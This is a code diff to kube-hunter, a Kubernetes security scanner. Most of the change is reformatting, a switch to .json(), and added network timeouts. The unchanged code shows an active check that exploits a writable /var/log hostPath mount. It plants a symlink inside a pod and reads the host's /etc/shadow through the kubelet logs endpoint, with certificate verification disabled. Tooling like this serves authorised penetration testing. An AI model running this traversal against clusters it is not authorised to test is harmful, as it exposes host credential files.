@@ -1,7 +1,7 @@
 import logging
-import json
 import uuid
 
+from kube_hunter.conf import config
 from kube_hunter.core.events import handler
 from kube_hunter.core.events.types import Event, Vulnerability
 from kube_hunter.core.types import ActiveHunter, Hunter, KubernetesCluster, PrivilegeEscalation
@@ -11,15 +11,25 @@ from kube_hunter.modules.hunting.kubelet import ExposedPodsHandler, ExposedRunHa
 class WriteMountToVarLog(Vulnerability, Event):
     """A pod can create symlinks in the /var/log directory on the host, which can lead to a root directory traveral"""
     def __init__(self, pods):
-        Vulnerability.__init__(self, KubernetesCluster, "Pod With Mount To /var/log", category=PrivilegeEscalation, vid="KHV047")
+        Vulnerability.__init__(
+            self,
+            KubernetesCluster,
+            "Pod With Mount To /var/log",
+            category=PrivilegeEscalation,
+            vid="KHV047")
         self.pods = pods
         self.evidence = "pods: {}".format(', '.join((pod["metadata"]["name"] for pod in self.pods)))
 
 
 class DirectoryTraversalWithKubelet(Vulnerability, Event):
-    """An attacker can run commands on pods with mount to /var/log, and traverse read all files on the host filesystem"""
+    """An attacker can run commands on pods with mount to /var/log,
+    and traverse read all files on the host filesystem"""
     def __init__(self, output):
-        Vulnerability.__init__(self, KubernetesCluster, "Root Traversal Read On The Kubelet", category=PrivilegeEscalation)
+        Vulnerability.__init__(
+            self,
+            KubernetesCluster,
+            "Root Traversal Read On The Kubelet",
+            category=PrivilegeEscalation)
         self.output = output
         self.evidence = "output: {}".format(self.output)
 
@@ -49,6 +59,7 @@ class VarLogMountHunter(Hunter):
         if pe_pods:
             self.publish_event(WriteMountToVarLog(pods=pe_pods))
 
+
 @handler.subscribe(ExposedRunHandler)
 class ProveVarLogMount(ActiveHunter):
     """Prove /var/log Mount Hunter
@@ -70,7 +81,10 @@ class ProveVarLogMount(ActiveHunter):
     # TODO: replace with multiple subscription to WriteMountToVarLog as well
     def get_varlog_mounters(self):
         logging.debug("accessing /pods manually on ProveVarLogMount")
-        pods = json.loads(self.event.session.get(self.base_path + KubeletHandlers.PODS.value, verify=False).text)["items"]
+        pods = self.event.session.get(
+            self.base_path + KubeletHandlers.PODS.value,
+            verify=False,
+            timeout=config.network_timeout).json()["items"]
         for pod in pods:
             volume = VarLogMountHunter(ExposedPodsHandler(pods=pods)).has_write_mount_to(pod, "/var/log")
             if volume:
@@ -91,7 +105,10 @@ class ProveVarLogMount(ActiveHunter):
         self.run("ln -s {} {}/{}".format(host_file, mount_path, symlink_name), container=container)
         # following symlink with kubelet
         path_in_logs_endpoint = KubeletHandlers.LOGS.value.format(path=host_path.strip('/var/log')+symlink_name)
-        content = self.event.session.get("{}{}".format(self.base_path, path_in_logs_endpoint), verify=False).text
+        content = self.event.session.get(
+            self.base_path + path_in_logs_endpoint,
+            verify=False,
+            timeout=config.network_timeout).text
         # removing symlink
         self.run("rm {}/{}".format(mount_path, symlink_name), container=container)
         return content
@@ -106,7 +123,11 @@ class ProveVarLogMount(ActiveHunter):
                     "namespace": pod["metadata"]["namespace"],
                 }
                 try:
-                    output = self.traverse_read("/etc/shadow", container=cont, mount_path=mount_path, host_path=volume["hostPath"]["path"])
+                    output = self.traverse_read(
+                        "/etc/shadow",
+                        container=cont,
+                        mount_path=mount_path,
+                        host_path=volume["hostPath"]["path"])
                     self.publish_event(DirectoryTraversalWithKubelet(output=output))
                 except Exception as x:
                     logging.debug("could not exploit /var/log: {}".format(x))
